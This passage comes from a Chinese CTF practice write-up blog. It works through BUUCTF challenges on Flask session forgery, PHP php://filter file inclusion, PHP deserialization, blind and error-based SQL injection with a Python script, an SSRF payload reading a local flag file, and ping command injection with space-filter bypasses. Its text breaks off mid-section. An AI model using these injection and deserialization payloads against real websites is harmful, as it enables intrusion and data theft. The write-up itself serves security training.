class=\"line\">&#123;u&#39;csrf_token&#39;: &#39;4454b0a6813beb6dee0f974d3f7a0e1a1a2d672f&#39;, u&#39;user_id&#39;: u&#39;10&#39;, u&#39;name&#39;: u&#39;test&#39;, u&#39;image&#39;: &#39;DBsO&#39;, u&#39;_fresh&#39;: True, u&#39;_id&#39;: &#39;2c49afadc99c45accaf899eead662e7ab78c68ca9c28f3f7ecc2621a18a5f5b22f04d31f1474e2c992bfd506916d9be9d90e89881b4aa68aefe45d9c7a5a8d16&#39;&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.eJw9kE-LwjAQxb_KMmcPtm4vgpcltVjIlJbYMLmIf2rTpHGhVVorfveNLngbeDPv_d48YHfuql7D8trdqhnsmhMsH_B1gCVwx-eZXDuShclEa5CVmkLUytRRJsuWZB6iSVsM1w1O2qDRhvweN9rxkBZKop_pzmU8ZkkcKFM23KSOs8Lyae24yBeYbO802Yi71Cm2HdDYEV0ekdtGitlBCZ_F6pFMoUnQN8nSKZEHinmeMA5IaMsFreA5g2PfnXfXX1tdPhWQ5QEmm-F1ygU2Sm5ClZQtTyjCyWN4TBI_7QuRRGrRHO-qXr3tGrevq49TEaeTGP6Vy955AfYn11xgBre-6t5_g2AOzz9EfG4F.X1R5Og.sdx02y47Ad8Rck93GVBwZ0RVTOs</span><br></pre></td></tr></table></figure>\n<p>之后进行改密码登录就可以。</p>\n<h1 id=\"文件包含\"><a href=\"#文件包含\" class=\"headerlink\" title=\"文件包含\"></a>文件包含</h1><h2 id=\"极客大挑战-2019-Secret\"><a href=\"#极客大挑战-2019-Secret\" class=\"headerlink\" title=\"[极客大挑战 2019]Secret\"></a>[极客大挑战 2019]Secret</h2><p>一直查看源码最后只需要用一个文件包含就可以读出flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;xxx.php</span><br><span class=\"line\">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</span><br></pre></td></tr></table></figure>\n<h2 id=\"ACTF2020-新生赛-Include\"><a href=\"#ACTF2020-新生赛-Include\" class=\"headerlink\" title=\"[ACTF2020 新生赛]Include\"></a>[ACTF2020 新生赛]Include</h2><p>直接读取flag.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>\n<h1 id=\"PHP反序列化\"><a href=\"#PHP反序列化\" class=\"headerlink\" title=\"PHP反序列化\"></a>PHP反序列化</h1><h2 id=\"极客大挑战-2019-PHP（简单反序列化）\"><a href=\"#极客大挑战-2019-PHP（简单反序列化）\" class=\"headerlink\" title=\"[极客大挑战 2019]PHP（简单反序列化）\"></a>[极客大挑战 2019]PHP（简单反序列化）</h2><p>考察php反序列化，先下载www.zip里面有三个文件，其中有class.php，index.php，flag.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">include &#39;flag.php&#39;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class Name&#123;</span><br><span class=\"line\">    private $username &#x3D; &#39;nonono&#39;;</span><br><span class=\"line\">    private $password &#x3D; &#39;yesyes&#39;;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __construct($username,$password)&#123;</span><br><span class=\"line\">        $this-&gt;username &#x3D; $username;</span><br><span class=\"line\">        $this-&gt;password &#x3D; $password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __wakeup()&#123;</span><br><span class=\"line\">        $this-&gt;username &#x3D; &#39;guest&#39;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __destruct()&#123;</span><br><span class=\"line\">        if ($this-&gt;password !&#x3D; 100) &#123;</span><br><span class=\"line\">            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;</span><br><span class=\"line\">            echo &quot;You name is: &quot;;</span><br><span class=\"line\">            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class=\"line\">            echo &quot;You password is: &quot;;</span><br><span class=\"line\">            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class=\"line\">            die();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;</span><br><span class=\"line\">            global $flag;</span><br><span class=\"line\">            echo $flag;</span><br><span class=\"line\">        &#125;else&#123;</span><br><span class=\"line\">            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;</span><br><span class=\"line\">            die();</span><br><span class=\"line\"></span><br><span class=\"line\">            </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>其中逻辑就是密码为100，并且username=’admin‘</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Name</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> $username = <span class=\"string\">\"admin\"</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> $password = <span class=\"string\">\"100\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a = <span class=\"keyword\">new</span> Name();</span><br><span class=\"line\">$a = serialize($a); </span><br><span class=\"line\"><span class=\"keyword\">echo</span> urlencode($a);</span><br><span class=\"line\"><span class=\"comment\">//O:4:\"Name\":3:&#123;s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";s:3:\"100\";&#125;</span></span><br></pre></td></tr></table></figure>\n<p>最后进行url编码就行。</p>\n<h2 id=\"ZJCTF-2019-NiZhuanSiWei\"><a href=\"#ZJCTF-2019-NiZhuanSiWei\" class=\"headerlink\" title=\"[ZJCTF 2019]NiZhuanSiWei\"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>看源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\">$text = $_GET[<span class=\"string\">\"text\"</span>];</span><br><span class=\"line\">$file = $_GET[<span class=\"string\">\"file\"</span>];</span><br><span class=\"line\">$password = $_GET[<span class=\"string\">\"password\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class=\"string\">'r'</span>)===<span class=\"string\">\"welcome to the zjctf\"</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br&gt;&lt;h1&gt;\"</span>.file_get_contents($text,<span class=\"string\">'r'</span>).<span class=\"string\">\"&lt;/h1&gt;&lt;/br&gt;\"</span>;  <span class=\"comment\">//text的内容为welcome to the zjctf</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/flag/\"</span>,$file))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"Not now!\"</span>;  <span class=\"comment\">//file的内容不能包含flag</span></span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(); </span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">include</span>($file);  <span class=\"comment\">//useless.php</span></span><br><span class=\"line\">        $password = unserialize($password);  <span class=\"comment\">//反序列化</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>看源码知道共有三个参数，所以依次判断</p>\n<p>text的内容为welcome to the zjctf，所以我们可以用data协议</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</span><br><span class=\"line\">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;</span><br></pre></td></tr></table></figure>\n<p>之后是file，题中已经提示了useless.php，说明我们首先得拿出源码，之后包含这个文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></figure>\n<p>拿出源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Flag</span></span>&#123;  <span class=\"comment\">//flag.php  </span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> $file;  </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__tostring</span><span class=\"params\">()</span></span>&#123;  </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;file))&#123;  </span><br><span class=\"line\">            <span class=\"keyword\">echo</span> file_get_contents(<span class=\"keyword\">$this</span>-&gt;file); </span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br&gt;\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (<span class=\"string\">\"U R SO CLOSE !///COME ON PLZ\"</span>);</span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>之后就是password，很明显是序列化</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;5bfc7735-e6c3-4e4b-9612-573138d921bd.node3.buuoj.cn&#x2F;?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<p>查看源码就有flag</p>\n<h2 id=\"网鼎杯-2018-Fakebook（报错注入和反序列化）\"><a href=\"#网鼎杯-2018-Fakebook（报错注入和反序列化）\" class=\"headerlink\" title=\"[网鼎杯 2018]Fakebook（报错注入和反序列化）\"></a>[网鼎杯 2018]Fakebook（报错注入和反序列化）</h2><p>首先发现信息泄露</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;user.php.bak</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">UserInfo</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $name = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $age = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $blog = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($name, $age, $blog)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;name = $name;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;age = (int)$age;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;blog = $blog;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get</span><span class=\"params\">($url)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;\t<span class=\"comment\">//创建一个curl资源</span></span><br><span class=\"line\">        $ch = curl_init();</span><br><span class=\"line\">       <span class=\"comment\">//设置url和相应的选项</span></span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);</span><br><span class=\"line\">      <span class=\"comment\">//抓取url并传递给浏览器</span></span><br><span class=\"line\">        $output = curl_exec($ch);</span><br><span class=\"line\">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($httpCode == <span class=\"number\">404</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">404</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      <span class=\"comment\">//关闭curl资源，并且释放系统资源</span></span><br><span class=\"line\">        curl_close($ch);</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//唯一的参数是curl_init()函数返回的句柄</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> $output;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getBlogContents</span> <span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;get(<span class=\"keyword\">$this</span>-&gt;blog);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isValidBlog</span> <span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $blog = <span class=\"keyword\">$this</span>-&gt;blog;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> preg_match(<span class=\"string\">\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i\"</span>, $blog);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>找了好长时间，找不到注入点</p>\n<p>后来发现，登录之后，可以查看一些信息</p>\n<p>并且很重要的是view.php中no是可以注入的</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">dic =<span class=\"string\">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class=\"line\">url = <span class=\"string\">\"\"</span></span><br><span class=\"line\">flag = <span class=\"string\">''</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">50</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">32</span>,<span class=\"number\">128</span>):</span><br><span class=\"line\">        payload = <span class=\"string\">\"http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;,2,3)\"</span>.format(i,j);</span><br><span class=\"line\">        r = requests.get(url=payload)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">\"Fatal\"</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            print(payload)</span><br><span class=\"line\">            flag += str(chr(j))</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    print(flag)</span><br><span class=\"line\">payload = <span class=\"string\">\"http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;,2,3)\"</span>.format(i,j);</span><br><span class=\"line\"><span class=\"comment\">#users</span></span><br><span class=\"line\">payload = <span class=\"string\">'http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_name=\"users\"),&#123;&#125;,1))=&#123;&#125;,2,3)'</span>.format(i,j);</span><br><span class=\"line\"><span class=\"comment\">#no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span></span><br><span class=\"line\">payload = <span class=\"string\">'http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(data) from users),&#123;&#125;,1))=&#123;&#125;,2,3)'</span>.format(i,j);</span><br><span class=\"line\"><span class=\"comment\">#O:8:\"UserInfo\":3:&#123;s:4:\"name\";s:5:\"admin\";s:3:\"age\";i:11;s:4:\"blog\";s:8:\"pz1o.top\";&#125;</span></span><br></pre></td></tr></table></figure>\n<p>其实也可以报错注入，但当时以为0x7e被ban了之后就不能报错了，tcl</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1%20and%20extractvalue(1,concat(%27$%27,(<span class=\"keyword\">select</span>(<span class=\"keyword\">group_concat</span>(<span class=\"keyword\">database</span>()))))%<span class=\"number\">23</span></span><br><span class=\"line\">fakebook</span><br><span class=\"line\"><span class=\"number\">1</span>%<span class=\"number\">20</span><span class=\"keyword\">and</span>%<span class=\"number\">20</span>extractvalue(<span class=\"number\">1</span>,<span class=\"keyword\">concat</span>(%<span class=\"number\">27</span>$%<span class=\"number\">27</span>,(<span class=\"keyword\">select</span><span class=\"comment\">/**/</span><span class=\"keyword\">group_concat</span>(table_name)<span class=\"comment\">/**/</span><span class=\"keyword\">from</span><span class=\"comment\">/**/</span>information_schema.tables<span class=\"comment\">/**/</span><span class=\"keyword\">where</span><span class=\"comment\">/**/</span>table_schema=<span class=\"keyword\">database</span>())))%<span class=\"number\">23</span></span><br><span class=\"line\"><span class=\"keyword\">users</span></span><br><span class=\"line\"><span class=\"number\">1</span>%<span class=\"number\">20</span><span class=\"keyword\">and</span>%<span class=\"number\">20</span>extractvalue(<span class=\"number\">1</span>,<span class=\"keyword\">concat</span>(%<span class=\"number\">27</span>$%<span class=\"number\">27</span>,(<span class=\"keyword\">select</span>%<span class=\"number\">20</span><span class=\"keyword\">group_concat</span>(column_name)%<span class=\"number\">20</span><span class=\"keyword\">from</span>%<span class=\"number\">20</span>information_schema.columns%<span class=\"number\">20</span><span class=\"keyword\">where</span>%<span class=\"number\">20</span>table_name=%<span class=\"number\">27</span><span class=\"keyword\">users</span>%<span class=\"number\">27</span>)))%<span class=\"number\">23</span></span><br><span class=\"line\"><span class=\"keyword\">no</span>,username,passwd,<span class=\"keyword\">data</span>,<span class=\"keyword\">USER</span>,CU</span><br><span class=\"line\"><span class=\"number\">1</span>%<span class=\"number\">20</span><span class=\"keyword\">and</span> extractvalue(%<span class=\"number\">27</span>$%<span class=\"number\">27</span>,<span class=\"keyword\">concat</span>(%<span class=\"number\">27</span>$%<span class=\"number\">27</span>,(<span class=\"keyword\">select</span> <span class=\"keyword\">data</span>%<span class=\"number\">20</span><span class=\"keyword\">from</span>%<span class=\"number\">20</span><span class=\"keyword\">users</span>)))%<span class=\"number\">23</span></span><br></pre></td></tr></table></figure>\n<p>做到这其实就不会做了。。。看大师傅的wp才知道可以no参数注入反序列化</p>\n<p>其中payload为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0%20union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,%27O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;%27%23</span><br></pre></td></tr></table></figure>\n<p>至于为什么会想到这个，首先data中就是反序列化的字符串，并且，最后一个blog内容会被显示出来，这样就希望从blog中获得flag</p>\n<h1 id=\"命令执行\"><a href=\"#命令执行\" class=\"headerlink\" title=\"命令执行\"></a>命令执行</h1><h2 id=\"GXYCTF2019-Ping-Ping-Ping（过滤空格和有黑名单）\"><a href=\"#GXYCTF2019-Ping-Ping-Ping（过滤空格和有黑名单）\" class=\"headerlink\" title=\"[GXYCTF2019]Ping Ping Ping（过滤空格和有黑名单）\"></a>[GXYCTF2019]Ping Ping Ping（过滤空格和有黑名单）</h2><p>直接ping命令执行</p>\n<p>用分号执行两个命令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?ip&#x3D;8.8.8.8;ls</span><br></pre></td></tr></table></figure>\n<p>查看有flag.php，重要的就是怎么去读取flag.php</p>\n<p><img src=\"/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200831111916451.png\" alt=\"image-20200831111916451\"></p>\n<p><strong>这里发现过滤了空格，所以绕过空格的办法，简单来说有两种</strong>，第一种是${IFS}</p>\n<ol>\n<li><p>```<br>root@kali:~# cat flag<br>this is your flag<br>root@kali:~# cat${IFS}flag<br>this is your flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">2.</span><br></pre></td></tr></table></figure>\n<p>root@kali:~# cat${IFS}$1flag<br>this is your flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">3.</span><br></pre></td></tr></table></figure>\n<p>root@kali:~# cat$IFS$1flag<br>this is your flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">第二种呢是重定向符</span><br><span class=\"line\"></span><br><span class=\"line\">1.</span><br></pre></td></tr></table></figure>\n<p>root@kali:~# cat&lt;&gt;flag<br>this is your flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">2.</span><br></pre></td></tr></table></figure>\n<p>root@kali:~# cat&lt;flag<br>this is your flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">这里呢我们选用$&#123;IFS&#125;来绕过，之后又发现&#123;&#125;被过滤，所以用第三个方式</span><br><span class=\"line\"></span><br><span 